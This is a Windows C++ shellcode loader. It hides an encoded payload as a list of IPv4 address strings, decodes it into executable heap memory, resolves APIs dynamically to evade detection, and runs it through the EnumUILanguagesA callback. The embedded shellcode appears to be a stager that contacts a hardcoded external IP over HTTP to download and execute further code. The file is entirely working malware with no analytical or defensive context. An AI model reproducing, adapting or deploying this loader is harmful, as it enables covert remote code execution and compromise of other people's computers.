#include <Windows.h>
#include <iostream>
#include <ip2string.h>
#pragma comment(lib, "Ntdll.lib")


//  shellcode -> ipv4
const char* ipv4[] =
{
    "252.72.131.228", "240.232.200.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82", "32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237", "82.65.81.72", "139.82.32.139", "66.60.72.1", "208.102.129.120", "24.11.2.117", "114.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68", "139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193", "56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68", "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73", "1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65", "89.90.72.139", "18.233.79.255", "255.255.93.106", "0.73.190.119", "105.110.105.110", "101.116.0.65", "86.73.137.230", "76.137.241.65", "186.76.119.38", "7.255.213.72", "49.201.72.49", "210.77.49.192", "77.49.201.65", "80.65.80.65", "186.58.86.121", "167.255.213.233", "147.0.0.0", "90.72.137.193", "65.184.187.1", "0.0.77.49", "201.65.81.65", "81.106.3.65", "81.65.186.87", "137.159.198.255", "213.235.121.91", "72.137.193.72", "49.210.73.137", "216.77.49.201", "82.104.0.50", "192.132.82.82", "65.186.235.85", "46.59.255.213", "72.137.198.72", "131.195.80.106", "10.95.72.137", "241.186.31.0", "0.0.106.0", "104.128.51.0", "0.73.137.224", "65.185.4.0", "0.0.65.186", "117.70.158.134", "255.213.72.137", "241.72.137.218", "73.199.192.255", "255.255.255.77", "49.201.82.82", "65.186.45.6", "24.123.255.213", "133.192.15.133", "157.1.0.0", "72.255.207.15", "132.140.1.0", "0.235.179.233", "228.1.0.0", "232.130.255.255", "255.47.76.112", "88.73.0.223", "230.85.11.199", "11.25.77.180", "116.143.6.137", "138.98.23.143", "194.138.200.33", "160.27.46.63", "249.207.75.50", "114.226.233.116", "45.108.50.245", "210.14.202.177", "138.10.198.242", "248.236.224.92", "128.94.134.98", "36.141.10.16", "81.214.218.175", "132.206.138.138", "167.250.120.24", "151.188.176.80", "0.85.115.101", "114.45.65.103", "101.110.116.58", "32.77.111.122", "105.108.108.97", "47.53.46.48", "32.40.99.111", "109.112.97.116", "105.98.108.101", "59.32.77.83", "73.69.32.49", "48.46.48.59", "32.87.105.110", "100.111.119.115", "32.78.84.32", "54.46.50.59", "32.87.79.87", "54.52.59.32", "84.114.105.100", "101.110.116.47", "54.46.48.59", "32.77.65.71", "87.74.83.41", "13.10.0.206", "117.141.251.125", "219.214.5.27", "203.197.69.250", "126.33.95.229", "195.11.136.243", "34.244.43.247", "85.250.92.110", "189.222.49.153", "187.239.26.30", "238.185.58.177", "86.188.177.70", "86.128.179.241", "123.136.147.162", "118.122.89.149", "74.103.6.45", "203.54.178.81", "133.131.184.252", "89.87.232.91", "33.87.162.31", "192.95.3.16", "225.133.4.176", "96.230.231.167", "152.82.50.64", "68.71.219.97", "183.17.66.90", "242.32.6.183", "198.154.38.237", "94.154.253.135", "158.115.102.169", "233.245.149.199", "116.99.77.45", "171.19.0.245", "230.128.0.244", "105.200.85.222", "230.157.119.44", "183.28.175.34", "233.167.252.28", "55.231.233.214", "209.142.254.48", "174.33.159.221", "233.220.98.188", "253.242.104.147", "238.97.76.225", "57.14.12.198", "55.163.227.164", "39.177.114.236", "176.243.251.156", "121.121.245.96", "119.115.205.197", "115.97.1.9", "181.195.117.112", "169.177.78.162", "0.65.190.240", "181.162.86.255", "213.72.49.201", "186.0.0.64", "0.65.184.0", "16.0.0.65", "185.64.0.0", "0.65.186.88", "164.83.229.255", "213.72.147.83", "83.72.137.231", "72.137.241.72", "137.218.65.184", "0.32.0.0", "73.137.249.65", "186.18.150.137", "226.255.213.72", "131.196.32.133", "192.116.182.102", "139.7.72.1", "195.133.192.117", "215.88.88.88", "72.5.0.0", "0.0.80.195", "232.127.253.255", "255.49.46.49", "53.46.56.48", "46.49.48.50", "0.73.150.2", "210.0.0.0"

};

typedef HANDLE(WINAPI* ImportHeapCreate)(
    _In_ DWORD flOptions,
    _In_ SIZE_T dwInitialSize,
    _In_ SIZE_T dwMaximumSize
    );

typedef LPVOID(WINAPI* ImportHeapAlloc)(
    _In_ HANDLE hHeap,
    _In_ DWORD dwFlags,
    _In_ SIZE_T dwBytes
    );

typedef NTSTATUS(NTAPI* ImportRtlIpv4StringToAddressA)(
    _In_ PCSTR S,
    _In_ BOOLEAN Strict,
    _Out_ PCSTR* Terminator,
    _Out_ struct in_addr* Addr
    );

typedef BOOL(WINAPI* ImportEnumUILanguagesA)(
    _In_ UILANGUAGE_ENUMPROCA lpUILanguageEnumProc,
    _In_ DWORD                dwFlags,
    _In_ LONG_PTR             lParam
    );


int main()
{
    ImportHeapCreate MyHeapCreate = (ImportHeapCreate)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "HeapCreate");
    ImportHeapAlloc MyHeapAlloc = (ImportHeapAlloc)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "HeapAlloc");
    ImportEnumUILanguagesA MyEnumUILanguagesA = (ImportEnumUILanguagesA)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "EnumUILanguagesA");

    HMODULE hModule = LoadLibraryA("ntdll.dll");
    ImportRtlIpv4StringToAddressA MyRtlIpv4StringToAddressA = (ImportRtlIpv4StringToAddressA)GetProcAddress(hModule, "RtlIpv4StringToAddressA");


    HANDLE hc = MyHeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = MyHeapAlloc(hc, 0, 0x100000);
    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(ipv4) / sizeof(ipv4[0]);
    PCSTR Terminator = "";

    for (int i = 0; i < elems; i++) {

        if (MyRtlIpv4StringToAddressA(ipv4[i], FALSE, &Terminator, (in_addr*)hptr) == STATUS_INVALID_PARAMETER)
        {
            printf("ERROR!");
            return 0;
        }
        hptr += 4;
    }


    MyEnumUILanguagesA((UILANGUAGE_ENUMPROCA)ha, 0, 0);
    CloseHandle(ha);
    return 0;
}



